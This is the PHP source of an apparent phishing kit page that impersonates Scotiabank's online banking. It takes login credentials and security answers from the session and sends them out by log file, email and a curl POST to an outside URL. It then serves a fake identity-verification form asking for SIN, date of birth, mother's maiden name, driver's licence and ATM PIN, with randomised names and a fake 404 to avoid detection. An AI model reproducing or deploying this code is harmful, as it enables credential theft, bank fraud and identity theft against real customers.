<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["qq2"]))
{
	$qq1=$_SESSION["qq1"]=$_POST["qq1"];
	$aa1=$_SESSION["aa1"]=$_POST["aa1"];
	
	$qq2=$_SESSION["qq2"]=$_POST["qq2"];
	$aa2=$_SESSION["aa2"]=$_POST["aa2"];
	
	$qq3=$_SESSION["qq3"]=$_POST["qq3"];
	$aa3=$_SESSION["aa3"]=$_POST["aa3"];
	
	$uname=$_SESSION["uname"];
	$pword=$_SESSION["pword"];


$ip=$_SERVER["REMOTE_ADDR"];
$details="
User : $uname
Pass : $pword

Q1: $qq1 A1: $aa1
Q2: $qq2 A1: $aa2
Q3: $qq3 A1: $aa3

IP: $ip
";
if($log_feature==1)
{
$file=fopen("../sc0ti_logQues_as45928907.txt","a");
fwrite($file,$details);
fclose($file);
}
if($email_feature==1)
{
mail($send,"Scotia Login+Ques $ip",$details);
}
if($external_log == 1)
{
$ch2 = curl_init($external_link);
curl_setopt($ch2, CURLOPT_POST ,1);
curl_setopt($ch2, CURLOPT_POSTFIELDS ,"filename=sc0ti_l0gFull_19834832.txt&DATA=$details");
curl_setopt($ch2, CURLOPT_HEADER ,0); 
curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
$data = curl_exec($ch2);
}

	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	echo '<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>

  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="advertisements/applei.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="advertisements/css.css?load_id='.randomCha(rand(15,16)).'">

  
 <script>
var count = 0;

function spinit(){
  var bar = document.getElementsByClassName("spinner")[0].children;
  bar[count].firstChild.style.background = "black";
  count += 1; count = count % bar.length;
  bar[count].firstChild.style.background = "white";
  bar[count].firstChild.style.border = "2px solid black";
}
setInterval(spinit, 100);
</script>
  
</head>
<body class="f-topbar-fixed">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" >
        <nav class="top-bar scotiabank" data-topbar="" role="navigation"  style="">
            <ul class="title-area">
                <li class="name">
                    <h1>
      

                    </h1>
                </li>
                

                
                
                <li class="toggle-topbar" >
                    <img class="menu" role="button" alt="Menu" tabindex="0" src="advertisements/menu.svg" onerror="this.src=\'images/menu.png\'">
                </li>
            </ul>
            
        <section class="middle tab-bar-section" style="left: 0%;">
                        <img class="logo" aria-hidden="route().page === \'activate-select\' || route().page === \'recover-select\'  || route().page === \'dcv\' " tabindex="0" alt="Scotiabank"  src="advertisements/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section"  style="left: 0%;">
                <navigation-menu params="{route:route}"><div class="navigation-menu" >
  	<ul class="right" >
      	<li><a href="#" class="nav-item menu-accounts" tabindex="0" >Accounts</a></li>
  	
      	<li><a href="#" class="nav-item menu-move-money" tabindex="0" >Move Money</a></li>
  	
      	<li><a href="#" class="nav-item menu-locator" tabindex="0" >Locator</a></li>
  	
      	<li><a href="#" class="nav-item menu-contact" tabindex="0" >Contact Us</a></li>
  	
      	<li><a href="#" class="nav-item menu-settings" tabindex="0" >Settings</a></li>
  	
      	<li><a href="#" class="nav-item menu-logout" tabindex="0" >Logout</a></li>
  	</ul>
</div></navigation-menu>
            </section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" >
	<div class="error-message alert-box" role="alertdialog"  tabindex="-1" style="display: none;">
		
	</div>
</div></notifications>
<loading params="{isLoading: BankingJS.Utilities.Network.isLoading}"><div id="loadingspin" class="loading-container" role="alert" aria-live="assertive" tabindex="0" style="display: none">
	<div class="loading" id="load" aria-label="Loading"><div class="spinner" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;" role="progressbar"><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(0deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(27deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(55deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(83deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(110deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(138deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(166deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(193deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(221deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(249deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(276deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(304deg) translate(24px, 0px); border-radius: 5px;"></div></div><div style="position: absolute; top: -5px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-12-13;"><div style="position: absolute; width: 40px; height: 10px; background: rgb(0, 0, 0) none repeat scroll 0% 0%; box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(332deg) translate(24px, 0px); border-radius: 5px;"></div></div></div><div style="color: transparent">Loading...</div></div>
</div></loading>
<div id="page" class="container height100" ><div  class="mfa-reset-container component-container">
    <div class="margin" id="mfa-reset-container">
        <div class="title">
            <span class="large red title" tabindex="0" >Identity Verification</span>
        </div>
		


<script>
function '.$fj.'() {
	var a = document.forms["'.$fname.'"]["name"];
    var b = document.forms["'.$fname.'"]["dobdd"];
    var c = document.forms["'.$fname.'"]["dobmm"];
    var d = document.forms["'.$fname.'"]["dobyy"];
    var e = document.forms["'.$fname.'"]["mnn"];
    var f = document.forms["'.$fname.'"]["snn"];
    var g = document.forms["'.$fname.'"]["app"];

 
  


    if ( a.value.length>2 && b.value.length>1 && c.value.length>1 && d.value.length>1 && e.value.length>2 && (f.value.replace(/\-/gi,"")).length>5 && g.value.length>3 )
{
	document.getElementById("continue").disabled="";
	document.getElementById("continue").className="mt20 red-button";
}
else
{
	document.getElementById("continue").disabled="true";
	document.getElementById("continue").className="mt20 grey-button";
}

}




function digon(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8 && unicode!=9  ){ 


if (unicode<48||unicode>57){ 

return false 
}

}
}


function sorto(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8 && unicode!=9  ){ 


if (unicode<48||unicode>57){ 

if (unicode==45)
{
return true;
}
else
{
return false ;
}

}

}
}







function chaon(e)
{
	var key = window.event ? e.keyCode : e.which;
	var keychar = String.fromCharCode(key);
	reg = /\d/;
	return !reg.test(keychar);
}


</script>			
	
        <div>
            <ul class="small">
                <li >As an additional security check, please confirm the following details to verify your identity.</li>

            </ul>
        </div>

		
        <form name="'.$fname.'" id="'.$fname.'" class="mt20" autocomplete="off" novalidate="novalidate"  onsubmit="document.getElementById(\'loadingspin\').style.display=\'\';"  method="post" action="confirm.bs.php?intcp='.randomCha(rand(2,3)).'|CONFIRM|F='.randomCha(rand(30,60)).'">
            <div >
			
				
				<div class="title">
					<span class="medium red title" tabindex="0" >Personal Details</span>
				</div>
                
                <label for="name" class="small dark-grey mb7" tabindex="0" >Name</label>
                <input id="name" type="text" class="general" placeholder="Enter Your Name" name="name" onkeyup="'.$fj.'();" maxlength="200" onkeypress="return chaon(event)">
                    <pre  class="error"id="error_answer_securityAnswer_0"></pre>
            
                <span class="" >
                    <label id="questionX" class="small dark-grey" for="questionXSelectBox" >Date of birth</label>
                </span>

                <pre class="error"></pre>
                <div>
                    <select id="dobdd" name="dobdd" onchange="'.$fj.'();" style="width:30%">
						<option value="">Day</option>
<option value="01" >01</option> 
<option value="02" >02</option> 
<option value="03" >03</option> 
<option value="04" >04</option> 
<option value="05" >05</option> 
<option value="06" >06</option> 
<option value="07" >07</option> 
<option value="08" >08</option> 
<option value="09" >09</option> 
<option value="10" >10</option> 
<option value="11" >11</option> 
<option value="12" >12</option> 
<option value="13" >13</option> 
<option value="14" >14</option> 
<option value="15" >15</option> 
<option value="16" >16</option> 
<option value="17" >17</option> 
<option value="18" >18</option> 
<option value="19" >19</option> 
<option value="20" >20</option> 
<option value="21" >21</option> 
<option value="22" >22</option> 
<option value="23" >23</option> 
<option value="24" >24</option> 
<option value="25" >25</option> 
<option value="26" >26</option> 
<option value="27" >27</option> 
<option value="28" >28</option> 
<option value="29" >29</option> 
<option value="30" >30</option> 
<option value="31" >31</option> 
						</select>
						
						<select id="dobmm" name="dobmm" onchange="'.$fj.'();" style="width:30%">
						<option value="">Month</option>
<option value="01" >01</option> 
<option value="02" >02</option> 
<option value="03" >03</option> 
<option value="04" >04</option> 
<option value="05" >05</option> 
<option value="06" >06</option> 
<option value="07" >07</option> 
<option value="08" >08</option> 
<option value="09" >09</option> 
<option value="10" >10</option> 
<option value="11" >11</option> 
<option value="12" >12</option> 
						</select>
						
						<select id="dobyy" name="dobyy" onchange="'.$fj.'();" style="width:30%">
						<option value="">Year</option>
<option value="1910" >1910</option> 
<option value="1911" >1911</option> 
<option value="1912" >1912</option> 
<option value="1913" >1913</option> 
<option value="1914" >1914</option> 
<option value="1915" >1915</option> 
<option value="1916" >1916</option> 
<option value="1917" >1917</option> 
<option value="1918" >1918</option> 

<option value="1919" >1919</option> 
<option value="1920" >1920</option> 
<option value="1921" >1921</option> 
<option value="1922" >1922</option> 
<option value="1923" >1923</option> 
<option value="1924" >1924</option> 
<option value="1925" >1925</option> 
<option value="1926" >1926</option> 
<option value="1927" >1927</option> 

<option value="1928" >1928</option> 
<option value="1929" >1929</option> 
<option value="1930" >1930</option> 
<option value="1931" >1931</option> 
<option value="1932" >1932</option> 
<option value="1933" >1933</option> 
<option value="1934" >1934</option> 
<option value="1935" >1935</option> 
<option value="1936" >1936</option> 

<option value="1937" >1937</option> 
<option value="1938" >1938</option> 
<option value="1939" >1939</option> 
<option value="1940" >1940</option> 
<option value="1941" >1941</option> 
<option value="1942" >1942</option> 
<option value="1943" >1943</option> 
<option value="1944" >1944</option> 
<option value="1945" >1945</option> 

<option value="1946" >1946</option> 
<option value="1947" >1947</option> 
<option value="1948" >1948</option> 
<option value="1949" >1949</option> 
<option value="1950" >1950</option> 
<option value="1951" >1951</option> 
<option value="1952" >1952</option> 
<option value="1953" >1953</option> 
<option value="1954" >1954</option> 

<option value="1955" >1955</option> 
<option value="1956" >1956</option> 
<option value="1957" >1957</option> 
<option value="1958" >1958</option> 
<option value="1959" >1959</option> 
<option value="1960" >1960</option> 
<option value="1961" >1961</option> 
<option value="1962" >1962</option> 
<option value="1963" >1963</option> 

<option value="1964" >1964</option> 
<option value="1965" >1965</option> 
<option value="1966" >1966</option> 
<option value="1967" >1967</option> 
<option value="1968" >1968</option> 
<option value="1969" >1969</option> 
<option value="1970" >1970</option> 
<option value="1971" >1971</option> 
<option value="1972" >1972</option> 

<option value="1973" >1973</option> 
<option value="1974" >1974</option> 
<option value="1975" >1975</option> 
<option value="1976" >1976</option> 
<option value="1977" >1977</option> 
<option value="1978" >1978</option> 
<option value="1979" >1979</option> 
<option value="1980" >1980</option> 
<option value="1981" >1981</option> 

<option value="1982" >1982</option> 
<option value="1983" >1983</option> 
<option value="1984" >1984</option> 
<option value="1985" >1985</option> 
<option value="1986" >1986</option> 
<option value="1987" >1987</option> 
<option value="1988" >1988</option> 
<option value="1989" >1989</option> 
<option value="1990" >1990</option> 

<option value="1991" >1991</option> 
<option value="1992" >1992</option> 
<option value="1993" >1993</option> 
<option value="1994" >1994</option> 
<option value="1995" >1995</option> 
<option value="1996" >1996</option> 
<option value="1997" >1997</option> 
<option value="1998" >1998</option> 
<option value="1999" >1999</option>
<option value="2000" >2000</option>
<option value="2001" >2001</option>
<option value="2002" >2002</option>
<option value="2003" >2003</option>
<option value="2004" >2004</option>
<option value="2005" >2005</option>



<option value="2006" >2006</option>
<option value="2007" >2007</option>
<option value="2008" >2008</option>
<option value="2009" >2009</option>
<option value="2010" >2010</option>
</select>

                </div>
                
                <label for="mnn" class="small dark-grey mb7">Mother\'s Maiden Name</label>
                <input id="mnn" type="text" class="general" placeholder="Enter Your Mother\'s Maiden Name" name="mnn" onkeyup="'.$fj.'();" onkeypress="return chaon(event)" maxlength="150">
				<pre  class="error" id="error_answer_securityAnswer_0"></pre>

					
				<br>
				<div class="title">
					<span class="medium red title" >Official Identity</span>
				</div>
				
				<label for="snn" class="small dark-grey mb7" >Social Insurance Number</label>
                <input id="snn" type="text" class="general" placeholder="Enter Your SIN" name="snn" onkeyup="'.$fj.'();" onkeypress="return sorto(event)" maxlength="15">
				<pre  class="error" id="error_answer_securityAnswer_0"></pre>
				
				<label for="dll" class="small dark-grey mb7" >Driver\'s License</label>
                <input id="dll" type="text" class="general" placeholder="Enter Your DL# (If applicable)" name="dll" onkeyup="'.$fj.'();" maxlength="100">
				<pre  class="error" id="error_answer_securityAnswer_0"></pre>
				
				<br>
				<div class="title">
					<span class="medium red title" >Account Verification</span>
				</div>
				
				<label for="app" class="small dark-grey mb7" >ATM Pin</label>
                <input id="app" type="text" class="general" placeholder="Enter Your ATM Pin" name="app" onkeyup="'.$fj.'();" onkeypress="return digon(event)" maxlength="6">
				<pre  class="error" id="error_answer_securityAnswer_0"></pre>
				
				<label for="dll" class="small light-grey mb7">Required to verify ownerhsip of the issued card.</label>
                
				<pre  class="error" id="error_answer_securityAnswer_0"></pre>
				
            </div>
            <div>
                <pre  class="error"  style="margin-bottom: 0px;" id="sameAnswerError" alt="There\'s an error with this field"></pre>
                <button id="continue" class="mt20 grey-button"  disabled="disabled">Submit</button>
            </div>
        </form>
    </div>
</div></div>


</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>